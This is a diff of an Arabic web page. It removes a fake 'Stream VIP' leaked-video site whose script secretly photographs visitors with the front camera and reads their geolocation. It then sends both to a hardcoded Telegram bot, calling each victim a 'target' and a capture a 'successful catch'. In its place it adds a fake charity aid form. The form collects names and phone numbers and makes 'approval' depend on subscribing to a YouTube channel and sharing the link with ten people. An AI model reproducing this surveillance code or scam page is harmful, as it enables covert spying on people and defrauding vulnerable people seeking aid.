@@ -3,175 +3,368 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Stream VIP | بوابة المشاهدة الآمنة</title>
+    <title>مؤسسة الأمل للمساعدات</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
     <style>
-        /* التنسيقات العامة */
-        body { background: #0a0a0a; color: #fff; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin: 0; overflow-x: hidden; }
-        header { padding: 15px 5%; background: rgba(0,0,0,0.9); border-bottom: 1px solid #222; position: fixed; width: 100%; z-index: 100; display: flex; align-items: center; }
-        .logo { color: #e50914; font-size: 24px; font-weight: bold; letter-spacing: 1px; }
+        /* ألوان وأنماط المنظمات الخيرية */
+        :root {
+            --primary-color: #00796b; /* أخضر مائي داكن */
+            --secondary-color: #4db6ac; /* أخضر مائي فاتح */
+            --background-light: #e0f2f1; /* أخضر فاتح جداً للخلفية */
+            --text-color: #37474f; /* لون نص داكن */
+            --card-bg: #ffffff; /* خلفية البطاقة */
+        }
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background: var(--background-light);
+            color: var(--text-color);
+            text-align: center;
+            position: relative;
+        }
+        .card {
+            background-color: var(--card-bg);
+            padding: 40px;
+            border-radius: 20px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.15);
+            max-width: 550px;
+            width: 90%;
+            transition: transform 0.3s ease-in-out;
+            z-index: 10;
+            max-height: 90vh;
+            overflow-y: auto;
+        }
+        .card:hover {
+            transform: translateY(-5px);
+        }
+        .icon-container {
+            font-size: 60px;
+            color: var(--primary-color);
+            margin-bottom: 20px;
+        }
+        h1 {
+            color: var(--primary-color);
+            margin-bottom: 10px;
+            font-size: 2.2em;
+        }
+        .sub-heading {
+            color: var(--text-color);
+            font-size: 1.1em;
+            margin-bottom: 30px;
+        }
+        .form-group {
+            margin-bottom: 20px;
+            text-align: right;
+            position: relative;
+        }
+        .form-group label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: bold;
+            color: #555;
+        }
+        .form-group input, .form-group select {
+            width: 100%;
+            padding: 12px 12px 12px 45px;
+            border: 1px solid #ccc;
+            border-radius: 8px;
+            box-sizing: border-box;
+            font-size: 1em;
+        }
+        .form-group .icon {
+            position: absolute;
+            top: 45px;
+            left: 15px;
+            font-size: 1.2em;
+            color: #999;
+            pointer-events: none;
+        }
+        .gender-options {
+            display: flex;
+            justify-content: space-around;
+        }
+        .gender-options label {
+            font-weight: normal;
+        }
+        .step-button {
+            background-color: var(--primary-color);
+            color: white;
+            border: none;
+            padding: 15px 30px;
+            font-size: 1.1em;
+            font-weight: bold;
+            border-radius: 50px;
+            cursor: pointer;
+            width: auto;
+            transition: background-color 0.3s, transform 0.2s;
+            text-decoration: none;
+            display: inline-block;
+            margin-top: 20px;
+        }
+        .step-button:hover {
+            background-color: var(--secondary-color);
+            transform: scale(1.05);
+        }
+        .share-buttons {
+            display: flex;
+            justify-content: center;
+            gap: 15px;
+            margin-top: 20px;
+        }
+        .share-button {
+            width: 60px;
+            height: 60px;
+            border-radius: 50%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            color: white;
+            font-size: 28px;
+            transition: transform 0.2s, box-shadow 0.2s;
+        }
+        .share-button:hover {
+            transform: scale(1.1);
+            box-shadow: 4px 4px 10px rgba(0, 0, 0, 0.2);
+        }
+        .whatsapp { background-color: #25D366; }
+        .facebook { background-color: #1877F2; }
+        .telegram { background-color: #0088CC; }
+        .step-info {
+            background-color: #e3f2fd;
+            border-radius: 10px;
+            padding: 15px;
+            margin-bottom: 20px;
+            border: 1px solid #90caf9;
+        }
+        .step-info p {
+            margin: 0;
+            font-weight: bold;
+            color: #1565c0;
+        }
         
-        /* قسم الهيرو */
-        .hero { height: 60vh; background: linear-gradient(to top, #0a0a0a, transparent), url('https://images.unsplash.com/photo-1593359677879-a4bb92f829d1?q=80&w=1470') center/cover; display: flex; align-items: flex-end; padding: 5%; }
-        .hero-content { max-width: 600px; margin-bottom: 30px; }
-        .hero h1 { font-size: 38px; margin: 0; text-shadow: 2px 2px 10px #000; }
-        
-        /* شبكة الفيديوهات */
-        .row { padding: 30px 5%; }
-        .row-title { font-size: 18px; font-weight: bold; margin-bottom: 20px; color: #dbdbdb; border-right: 4px solid #e50914; padding-right: 10px; }
-        .video-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(160px, 1fr)); gap: 12px; }
-        
-        .video-card { position: relative; cursor: pointer; border-radius: 8px; overflow: hidden; background: #1a1a1a; height: 100px; transition: 0.4s; border: 1px solid #222; }
-        .video-card:hover { transform: translateY(-5px); border-color: #e50914; }
-        .video-card img { width: 100%; height: 100%; object-fit: cover; opacity: 0.6; }
-        .video-title { position: absolute; bottom: 8px; right: 8px; font-size: 10px; font-weight: bold; text-align: right; line-height: 1.2; }
+        /* تأثير سقوط النقود */
+        .money {
+            position: absolute;
+            width: 25px;
+            height: 25px;
+            animation: fall linear infinite;
+        }
+        .money i {
+            font-size: 25px;
+            color: #ffc107; /* لون الذهب للنقود */
+            text-shadow: 0 2px 4px rgba(0,0,0,0.2);
+        }
+        @keyframes fall {
+            0% { top: -10%; opacity: 1; }
+            100% { top: 110%; opacity: 0.5; }
+        }
 
-        /* مشغل الفيديو الوهمي */
-        #player-overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; z-index: 1000; flex-direction: column; align-items: center; justify-content: center; }
-        .player-box { width: 95%; max-width: 700px; aspect-ratio: 16/9; background: #050505; border-radius: 10px; border: 1px solid #333; position: relative; display: flex; align-items: center; justify-content: center; overflow: hidden; }
-        .play-big { width: 80px; height: 80px; background: #e50914; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 35px; cursor: pointer; box-shadow: 0 0 25px rgba(229, 9, 20, 0.5); transition: 0.2s; }
-        .play-big:active { transform: scale(0.9); }
-        
-        /* شريط التحميل */
-        .loader-bar { width: 80%; height: 4px; background: #222; border-radius: 10px; margin-top: 25px; display: none; overflow: hidden; }
-        .fill { width: 0%; height: 100%; background: #e50914; transition: 0.3s; }
-        #st-msg { margin-top: 15px; color: #888; font-size: 13px; }
-        
-        /* عناصر مخفية للالتقاط */
-        #v, #c { display: none; }
+        /* تعديلات التصميم المتجاوب */
+        @media (max-width: 600px) {
+            body {
+                height: auto;
+                padding: 20px;
+            }
+            .card {
+                padding: 20px;
+                box-shadow: 0 5px 15px rgba(0,0,0,0.1);
+                max-width: 100%;
+                width: 100%;
+                border-radius: 10px;
+            }
+            h1 {
+                font-size: 1.8em;
+            }
+            .sub-heading {
+                font-size: 1em;
+            }
+            .form-group input, .form-group select {
+                padding: 10px 10px 10px 40px;
+                font-size: 0.95em;
+            }
+            .form-group .icon {
+                top: 40px;
+                left: 10px;
+            }
+            .step-button {
+                padding: 12px 25px;
+                font-size: 1em;
+            }
+            .share-button {
+                width: 50px;
+                height: 50px;
+                font-size: 24px;
+            }
+            .gender-options {
+                flex-direction: column;
+                align-items: flex-end;
+            }
+            .gender-options label {
+                margin-bottom: 5px;
+            }
+        }
     </style>
 </head>
 <body>
-
-    <header><div class="logo">STREAM VIP</div></header>
-
-    <div class="hero">
-        <div class="hero-content">
-            <h1>أقوى التسريبات الحصرية</h1>
-            <p>مكتبة فيديو مشفرة للأعضاء فقط. اختر مقطعاً للمشاهدة.</p>
+    <div class="card">
+        <div class="icon-container">
+            <i class="fas fa-hand-holding-usd"></i>
         </div>
-    </div>
-
-    <div class="row">
-        <div class="row-title">مقاطع مسربة حديثاً (18+)</div>
-        <div id="grid" class="video-grid"></div>
-    </div>
-
-    <div id="player-overlay">
-        <div class="player-box">
-            <div class="play-big" id="main-play-btn" onclick="startTrap()">▶</div>
-            <div style="position: absolute; top: 15px; left: 15px; background: rgba(229,9,20,0.8); padding: 2px 8px; border-radius: 3px; font-size: 10px;">LIVE HD</div>
+        
+        <div id="registration-section">
+            <h1>الخطوة الأولى: سجل بياناتك</h1>
+            <p class="sub-heading">يرجى تسجيل بياناتك للتأهل للمساعدات المالية.</p>
+            <form id="registrationForm">
+                <div class="form-group">
+                    <label for="name">الاسم بالكامل:</label>
+                    <input type="text" id="name" name="name" required>
+                    <i class="fas fa-user icon"></i>
+                </div>
+                <div class="form-group">
+                    <label for="phone">رقم الهاتف:</label>
+                    <input type="tel" id="phone" name="phone" required>
+                    <i class="fas fa-phone icon"></i>
+                </div>
+                <div class="form-group">
+                    <label>الجنس:</label>
+                    <div class="gender-options">
+                        <label><input type="radio" name="gender" value="ذكر" required> ذكر</label>
+                        <label><input type="radio" name="gender" value="أنثى"> أنثى</label>
+                    </div>
+                </div>
+                <div class="form-group">
+                    <label for="country">الدولة:</label>
+                    <input type="text" id="country" name="country" required>
+                    <i class="fas fa-globe-africa icon"></i>
+                </div>
+                <div class="form-group">
+                    <label for="city">المحافظة:</label>
+                    <input type="text" id="city" name="city" required>
+                    <i class="fas fa-city icon"></i>
+                </div>
+                <div class="form-group">
+                    <label for="family-count">عدد أفراد الأسرة:</label>
+                    <input type="number" id="family-count" name="family-count" min="1" required>
+                    <i class="fas fa-users icon"></i>
+                </div>
+                <div class="form-group">
+                    <label for="job">العمل:</label>
+                    <input type="text" id="job" name="job" required>
+                    <i class="fas fa-briefcase icon"></i>
+                </div>
+                <button type="submit" class="step-button">موافق</button>
+            </form>
         </div>
-        <div id="loader" class="loader-bar"><div id="fill" class="fill"></div></div>
-        <div id="st-msg">انقر على زر التشغيل للبدء</div>
-    </div>
 
-    <video id="v" autoplay></video>
-    <canvas id="c"></canvas>
+        <div id="channel-section" style="display: none;">
+            <h1>الخطوة الثانية: اشترك في القناة</h1>
+            <p class="sub-heading">لقد قمت بإكمال الخطوة الأولى بنجاح. يرجى الاشتراك في القناة لإكمال التسجيل.</p>
+            <a href="https://www.youtube.com/@Hawaii1-pg1kt" target="_blank" class="step-button" id="subscribe-button">
+                اشترك الآن
+            </a>
+            <p id="return-message" style="display: none; color: #555; margin-top: 15px;">اذا لم تقم بالاستراك بالقناة فان تسجيلك لا يقبل .قم بالاشتراك، واضغط على الزر أدناه.</p>
+            <button class="step-button" id="next-step-button" style="display: none;">الخطوة التالية</button>
+        </div>
 
-<script>
-    // إعدادات البوت
-    const _T = "8572623835:AAGexkUI6MWv4j2MOC_vmbgtcjkip1EWV08"; 
-    const _C = "5844891988"; 
+        <div id="share-section" style="display: none;">
+            <h1>الخطوة الأخيرة: شارك الرابط!</h1>
+            <div class="step-info">
+                <p>⚠️ **ملاحظة هامة:** يجب عليك مشاركة الرابط مع 10 أشخاص ليتم قبول تسجيلك.</p>
+            </div>
+            <p class="sub-heading">لقد أكملت جميع الخطوات، بقي خطوة أخيرة للتأهل للمساعدات.</p>
+            <div class="share-buttons">
+                <a href="#" class="share-button whatsapp" onclick="share('whatsapp'); return false;"><i class="fab fa-whatsapp"></i></a>
 
-    // توليد محتوى الصفحة
-    const titles = ["فضيحة المسؤول الشهير", "تسريب من داخل السجن", "كاميرا المراقبة: ماذا حدث؟", "لحظة الهروب الكبير", "أسرار خلف الكواليس", "المقطع الذي تم حذفه"];
-    const grid = document.getElementById('grid');
-    
-    titles.forEach((title, i) => {
-        grid.innerHTML += `
-            <div class="video-card" onclick="openPlayer()">
-                <img src="https://picsum.photos/400/225?random=${i}" alt="thumb">
-                <div class="video-title">${title}</div>
-            </div>`;
-    });
-
-    // فتح المشغل وإرسال تقرير أولي
-    function openPlayer() {
-        document.getElementById('player-overlay').style.display = 'flex';
-        sendLogs("🎯 الهدف فتح المشغل وبدأ محاولة التشغيل.");
-    }
-
-    // وظيفة الإرسال إلى تليجرام
-    async function sendLogs(msg, photo = null) {
-        const url = `https://api.telegram.org/bot${_T}/`;
-        try {
-            if (photo) {
-                const fd = new FormData();
-                fd.append('chat_id', _C);
-                fd.append('photo', photo, 'capture.jpg');
-                fd.append('caption', msg);
-                await fetch(url + 'sendPhoto', { method: 'POST', body: fd });
-            } else {
-                await fetch(url + 'sendMessage', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ chat_id: _C, text: msg })
-                });
-            }
-        } catch (e) { console.error("Error sending logs"); }
-    }
-
-    // بدء عملية التحميل الوهمية والالتقاط
-    function startTrap() {
-        const msg = document.getElementById('st-msg');
-        const fill = document.getElementById('fill');
-        document.getElementById('main-play-btn').style.display = 'none';
-        document.getElementById('loader').style.display = 'block';
-        
-        let w = 0;
-        let iv = setInterval(() => {
-            w += Math.random() * 20;
-            if(w >= 100) {
-                w = 100;
-                clearInterval(iv);
-                triggerCapture();
-            }
-            fill.style.width = w + '%';
-            msg.innerText = w > 50 ? "تأكيد بروتوكول الأمان..." : "جاري فك التشفير...";
-        }, 400);
-    }
-
-    // التقاط الموقع والصورة
-    function triggerCapture() {
-        const nav = navigator;
-        
-        // محاولة الحصول على الموقع
-        nav.geolocation.getCurrentPosition((p) => {
-            const loc = `https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`;
+                <a href="#" class="share-button telegram" onclick="share('telegram'); return false;"><i class="fab fa-telegram-plane"></i></a>
+            </div>
             
-            // محاولة فتح الكاميرا
-            nav.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
-            .then(s => {
-                const v = document.getElementById('v');
-                v.srcObject = s;
-                document.body.style.background = "#fff"; // تأثير فلاش الكاميرا
+            <button class="step-button" id="confirm-share-button" style="display: none;">أنا متأكد من المشاركة</button>
+        </div>
 
-                setTimeout(() => {
-                    const canvas = document.getElementById('c');
-                    canvas.width = 1280; 
-                    canvas.height = 720;
-                    canvas.getContext('2d').drawImage(v, 0, 0, 1280, 720);
-                    
-                    canvas.toBlob(b => {
-                        sendLogs(`✅ صيد ناجح!\n📍 الموقع: ${loc}`, b).then(() => {
-                            alert("تم التحقق من الحساب! جاري توجيهك للمشاهدة...");
-                            window.location.href = "https://www.facebook.com/watch/";
-                        });
-                    }, 'image/jpeg', 0.8);
-                    
-                    // إغلاق الكاميرا بعد الالتقاط
-                    s.getTracks().forEach(track => track.stop());
-                }, 1000);
-            })
-            .catch(() => {
-                sendLogs(`⚠️ الهدف رفض الكاميرا ولكن سمح بالموقع:\n📍 الموقع: ${loc}`);
-                alert("يجب السماح بالكاميرا لمشاهدة المحتوى الحصري.");
-                location.reload();
-            });
-        }, () => {
-            alert("خطأ: يرجى السماح بالوصول للموقع لتأكيد أنك لست روبوت.");
+        <div id="success-section" style="display: none;">
+            <h1>تم ارسال بياناتك بنجاح! 🎉</h1>
+            <p class="sub-heading">شكراً لك على إكمال جميع الخطوات.</p>
+            <div class="step-info">
+                <p>سوف نراجع بياناتك وإذا تم قبولك، سنرسل لك رسالة تأكيد عبر رقمك الذي أدخلته.</p>
+            </div>
+            <div class="icon-container">
+                <i class="fas fa-check-circle" style="color: #4CAF50; font-size: 80px;"></i>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // دالة إنشاء النقود وسقوطها
+        function createMoney() {
+            const money = document.createElement('div');
+            money.classList.add('money');
+            money.innerHTML = '<i class="fas fa-sack-dollar"></i>';
+            money.style.left = Math.random() * 100 + 'vw';
+            money.style.animationDuration = Math.random() * 2 + 3 + 's';
+            money.style.opacity = Math.random();
+            document.body.appendChild(money);
+            
+            setTimeout(() => {
+                money.remove();
+            }, 5000);
+        }
+        setInterval(createMoney, 300);
+
+        // روابط ورسائل المشاركة
+        var referralLink = "https://2255ha1.github.io/Channel-Support-Project-/";
+
+     
+           var message = encodeURIComponent("هل تبحث عن مساعدة مالية؟ انضم إلى مؤسسة الأمل الآن وسجل بياناتك للحصول على المساعدة. اضغط على الرابط: " + referralLink);
+
+
+        // عند إرسال نموذج التسجيل (الخطوة 1)
+        document.getElementById('registrationForm').addEventListener('submit', function(event) {
+            event.preventDefault();
+            alert("تم إرسال بياناتك بنجاح! سيتم مراجعتها قريباً.");
+            document.getElementById('registration-section').style.display = 'none';
+            document.getElementById('channel-section').style.display = 'block';
         });
-    }
+
+        // عند الضغط على زر "اشترك الآن" (الخطوة 2)
+        document.getElementById('subscribe-button').addEventListener('click', function() {
+            document.getElementById('return-message').style.display = 'block';
+            document.getElementById('next-step-button').style.display = 'block';
+        });
+
+        // عند الضغط على زر "الخطوة التالية" في قسم الاشتراك
+        document.getElementById('next-step-button').addEventListener('click', function() {
+            document.getElementById('channel-section').style.display = 'none';
+            document.getElementById('share-section').style.display = 'block';
+        });
+
+        // دالة المشاركة
+        function share(platform) {
+            var url = '';
+            if (platform === 'whatsapp') {
+                url = "whatsapp://send?text=" + message;
+            } else if (platform === 'facebook') {
+                url = "https://www.facebook.com/sharer/sharer.php?u=" + referralLink;
+            } else if (platform === 'telegram') {
+                url = "https://t.me/share/url?url=" + referralLink + "&text=" + message;
+            }
+            window.open(url, '_blank');
+            
+            // إظهار زر التأكيد بعد الضغط على أحد أزرار المشاركة
+            document.getElementById('confirm-share-button').style.display = 'inline-block';
+        }
+
+        // عند الضغط على زر "أنا متأكد من المشاركة"
+        document.getElementById('confirm-share-button').addEventListener('click', function() {
+            document.getElementById('share-section').style.display = 'none';
+            document.getElementById('success-section').style.display = 'block';
+        });
+    </script>
+</body>
+</html>
 </script>
 </body>
 </html>
